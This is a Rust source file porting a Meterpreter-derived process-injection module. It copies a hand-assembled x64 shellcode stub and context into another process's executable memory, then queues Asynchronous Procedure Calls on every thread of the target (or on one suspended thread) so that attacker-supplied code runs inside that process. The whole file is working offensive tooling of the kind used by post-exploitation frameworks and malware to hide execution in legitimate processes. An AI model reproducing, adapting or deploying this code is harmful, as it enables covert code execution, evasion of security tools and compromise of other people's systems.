//! Port of src/inject_apcthread.cpp — process injection with an
//! Asynchronous Procedure Call queue attached to Windows threads
//! (taken from Meterpreter).
//!
//! The technique copies a small stub (`_migrateit`) plus an `APCCONTEXT`
//! into the target process and queues an APC on every thread of the target
//! PID. The stub, when it fires inside the target, checks the thread's
//! ActivationContextStackPointer and, if valid, creates a fresh thread via
//! the `CreateThread` pointer stored in the context so the original thread
//! keeps functioning normally.
//!
//! The C++ obtains `_migrateit`'s machine code by copying the compiled
//! function's bytes. The Rust port targets x64, so the equivalent stub is
//! provided as a hand-assembled x64 byte array with identical behaviour
//! (same APCCONTEXT layout, same TEB offset 0x2C8 for
//! ActivationContextStackPointer, same `fired` flag protocol).

use crate::inject::InjectContext;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateThread, OpenThread, ResumeThread, Sleep, THREAD_ALL_ACCESS,
};

// The `_migrateit` stub compiled for x64 (see module docs). RCX holds the
// APCCONTEXT pointer; struct offsets: lpStartAddress=0, lpParameter=8,
// pCreateThread=16, fired=24 (BOOL, 4 bytes, struct padded to 32).
const MIGRATEIT_STUB: [u8; 87] = [
    // mov eax, [rcx+24]                    ; context->fired
    0x8B, 0x41, 0x18,
    // test eax, eax
    0x85, 0xC0,
    // jnz done
    0x75, 0x4F,
    // mov dword ptr [rcx+24], 1            ; context->fired = TRUE
    0xC7, 0x41, 0x18, 0x01, 0x00, 0x00, 0x00,
    // mov rax, gs:[0x30]                   ; TEB (NT_TIB.Self)
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
    // cmp qword ptr [rax+0x2C8], 0         ; teb->actctx == NULL?
    0x48, 0x83, 0xB8, 0xC8, 0x02, 0x00, 0x00, 0x00,
    // jnz do_create
    0x75, 0x08,
    // mov dword ptr [rcx+24], 0            ; context->fired = FALSE
    0xC7, 0x41, 0x18, 0x00, 0x00, 0x00, 0x00,
    // ret
    0xC3,
    // do_create: push rbp
    0x55,
    // mov rbp, rsp
    0x48, 0x8B, 0xEC,
    // sub rsp, 0x30                        ; shadow space + 2 stack args, keeps 16-byte alignment
    0x48, 0x83, 0xEC, 0x30,
    // mov rax, [rcx+16]                    ; context->pCreateThread
    0x48, 0x8B, 0x41, 0x10,
    // mov r8, [rcx]                        ; lpStartAddress
    0x4C, 0x8B, 0x01,
    // mov r9, [rcx+8]                      ; lpParameter
    0x4C, 0x8B, 0x49, 0x08,
    // xor ecx, ecx                         ; lpThreadAttributes = NULL
    0x33, 0xC9,
    // xor edx, edx                         ; dwStackSize = 0
    0x33, 0xD2,
    // mov qword ptr [rsp+0x28], 0          ; lpThreadId = NULL
    0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
    // mov qword ptr [rsp+0x20], 0          ; dwCreationFlags = 0
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
    // call rax                             ; pCreateThread(...)
    0xFF, 0xD0,
    // leave
    0xC9,
    // ret
    0xC3,
    // done: ret
    0xC3,
];

/// The context mirrored into the target process (APCCONTEXT). Layout must
/// match the C struct exactly: three pointers, then the BOOL `fired`.
#[repr(C)]
#[derive(Clone, Copy)]
struct ApcContext {
    lp_start_address: *mut c_void,
    lp_parameter: *mut c_void,
    p_create_thread: *mut c_void,
    fired: i32,
}

/// NTSTATUS NtQueueApcThread(HANDLE, PVOID, PVOID, PVOID, PVOID).
type NtQueueApcThread = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, *mut c_void, *mut c_void) -> i32;

/// Combine the APC context and the `_migrateit` stub into one block in the
/// remote process (copycontext). RWX is necessary because the stub modifies
/// the `fired` parameter.
unsafe fn copycontext(h_process: isize, _pid: u32, context: &ApcContext) -> *mut u8 {
    let fnsize = MIGRATEIT_STUB.len();
    let size = fnsize + std::mem::size_of::<ApcContext>();

    /* combine the apc context and the function into one place */
    let mut ctx_local = Vec::<u8>::with_capacity(size);
    let ctx_bytes = std::slice::from_raw_parts(
        context as *const ApcContext as *const u8,
        std::mem::size_of::<ApcContext>(),
    );
    ctx_local.extend_from_slice(ctx_bytes);
    ctx_local.extend_from_slice(&MIGRATEIT_STUB);

    /* RWX is necessary because we modify the parameter fired */
    let ctx_remote = VirtualAllocEx(
        h_process as HANDLE,
        std::ptr::null(),
        size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    /* write our process memory */
    let mut result = ctx_remote;
    let mut wrote: usize = 0;
    if !ctx_remote.is_null()
        && WriteProcessMemory(
            h_process as HANDLE,
            ctx_remote,
            ctx_local.as_ptr() as *const c_void,
            size,
            &mut wrote,
        ) != 0
    {
        if wrote != size {
            result = std::ptr::null_mut(); /* TODO: should ctx_remote be released in the remote process */
        }
    }

    result as *mut u8
}

/// Queue the APC stub on every thread of the target process
/// (inject_via_apcthread). Assumes injection into a same-arch process.
pub fn inject_via_apcthread(injctx: &mut InjectContext, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let Some(p_nt_queue_apc_thread) = GetProcAddress(ntdll, b"NtQueueApcThread\0".as_ptr()) else {
            return false;
        };
        let p_nt_queue_apc_thread: NtQueueApcThread = std::mem::transmute(p_nt_queue_apc_thread);

        /* setup our context... assumes we're injecting into a same arch process */
        let mut ctx: ApcContext = std::mem::zeroed();
        ctx.lp_start_address = lp_start_address;
        ctx.lp_parameter = lp_parameter;
        ctx.p_create_thread = CreateThread as *const () as *mut c_void;
        ctx.fired = 0;

        /* OK, we made it this far, let's mirror our context */
        let remote_context = copycontext(injctx.h_process, injctx.pid, &ctx);
        if remote_context.is_null() {
            return false;
        }

        /* take a snapshot of some threads */
        let h_thread_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if h_thread_snap.is_null() {
            return false;
        }

        let mut t: THREADENTRY32 = std::mem::zeroed();
        t.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(h_thread_snap, &mut t) == 0 {
            return false;
        }

        loop {
            /* Only proceed if we are targeting a thread in the target process */
            if t.th32OwnerProcessID == injctx.pid {
                /* Open a handle to this thread so we can do the apc injection */
                let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, t.th32ThreadID);
                if !h_thread.is_null() {
                    /* queue our APC method */
                    p_nt_queue_apc_thread(
                        h_thread,
                        (remote_context as usize + std::mem::size_of::<ApcContext>()) as *mut c_void,
                        remote_context as *mut c_void,
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                    );

                    /* close the handle */
                    CloseHandle(h_thread);
                }
            }

            if Thread32Next(h_thread_snap, &mut t) == 0 {
                break;
            }
        }

        /* kill our thread snapshot too */
        CloseHandle(h_thread_snap);

        /* wait... */
        Sleep(200);

        /* read the APC context to determine if we succeeded or failed */
        let mut x: usize = 0;
        if ReadProcessMemory(
            injctx.h_process as HANDLE,
            remote_context as *const c_void,
            &mut ctx as *mut ApcContext as *mut c_void,
            std::mem::size_of::<ApcContext>(),
            &mut x,
        ) == 0
            || x != std::mem::size_of::<ApcContext>()
        {
            return false;
        }

        /* if we did not fire, make it so we don't accidentally kick off later */
        if ctx.fired == 0 {
            ctx.fired = 1; /* update so that future wake-ups don't try anything */
            WriteProcessMemory(
                injctx.h_process as HANDLE,
                remote_context as *const c_void,
                &ctx as *const ApcContext as *const c_void,
                std::mem::size_of::<ApcContext>(),
                &mut x,
            );
            return false;
        }

        /* ctx.fired == 1, so we probably fired successfully */
        true
    }
}

/// Queue the APC on the single suspended thread handle in the context and
/// resume it (inject_via_apcthread_targeted).
pub fn inject_via_apcthread_targeted(ictx: &mut InjectContext, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let Some(p_nt_queue_apc_thread) = GetProcAddress(ntdll, b"NtQueueApcThread\0".as_ptr()) else {
            return false;
        };
        let p_nt_queue_apc_thread: NtQueueApcThread = std::mem::transmute(p_nt_queue_apc_thread);

        /* add to the APC queue of the target thread */
        if p_nt_queue_apc_thread(
            ictx.h_thread as HANDLE,
            lp_start_address,
            lp_parameter,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        ) != 0
        {
            return false;
        }

        /* try to resume the thread... punt if it fails */
        ResumeThread(ictx.h_thread as HANDLE) != u32::MAX
    }
}
